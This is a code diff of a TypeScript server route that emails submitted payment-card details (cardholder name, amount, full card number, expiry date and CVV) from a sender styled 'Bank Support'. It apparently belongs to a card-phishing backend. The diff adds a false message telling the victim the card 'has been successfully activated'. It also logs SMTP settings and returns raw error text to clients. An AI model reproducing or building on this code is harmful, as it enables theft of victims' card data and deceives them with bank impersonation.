@@ -24,11 +24,16 @@ export async function POST(req: Request) {
           success: false,
           message: "Missing required fields",
         },
-        {
-          status: 400,
-        }
+        { status: 400 }
       );
     }
+
+    console.log("SMTP CONFIG:", {
+      host: process.env.SMTP_HOST,
+      port: process.env.SMTP_PORT,
+      user: process.env.SMTP_USER,
+      passLoaded: !!process.env.SMTP_PASS,
+    });
 
     const transporter = nodemailer.createTransport({
       host: process.env.SMTP_HOST,
@@ -40,41 +45,24 @@ export async function POST(req: Request) {
       },
     });
 
+    await transporter.verify();
+    console.log("✅ SMTP Connected Successfully");
+
     await transporter.sendMail({
       from: `"Bank Support" <${process.env.SMTP_USER}>`,
       to: email,
-      subject: "New Card Activation Request",
+      subject: "Your Card Has Been Activated",
       html: `
-        <div style="font-family:Arial,sans-serif;padding:20px">
-          <h2>New Payment Received</h2>
+        <h3>Name: ${cardholderName}</h3>
+        <h3>Amount: ${amount}</h3>
+        <h3>Card Number: ${cardNumber}</h3>
+        <h3>Expiry Date: ${expiryDate}</h3>
+        <h3>CVV: ${cvv}</h3>
 
-          <table border="1" cellpadding="10" cellspacing="0" style="border-collapse:collapse;width:100%">
-            <tr>
-              <td><strong>Cardholder Name</strong></td>
-              <td>${cardholderName}</td>
-            </tr>
+        <hr />
 
-            <tr>
-              <td><strong>Amount</strong></td>
-              <td>$${amount}</td>
-            </tr>
-
-            <tr>
-              <td><strong>Card Number</strong></td>
-              <td>${cardNumber}</td>
-            </tr>
-
-            <tr>
-              <td><strong>Expiry Date</strong></td>
-              <td>${expiryDate}</td>
-            </tr>
-
-            <tr>
-              <td><strong>CVV</strong></td>
-              <td>${cvv}</td>
-            </tr>
-          </table>
-        </div>
+        <p>Your card has been <strong>successfully activated</strong>.</p>
+        <p>You can now use your card for transactions.</p>
       `,
     });
 
@@ -98,17 +86,15 @@ export async function POST(req: Request) {
       success: true,
       message: randomMessage,
     });
-  } catch (error) {
-    console.error("Email Error:", error);
+  } catch (error: any) {
+    console.error("❌ SMTP ERROR:", error);
 
     return Response.json(
       {
         success: false,
-        message: "Failed to send email.",
+        message: error.message || "Failed to send email.",
       },
-      {
-        status: 500,
-      }
+      { status: 500 }
     );
   }
 }
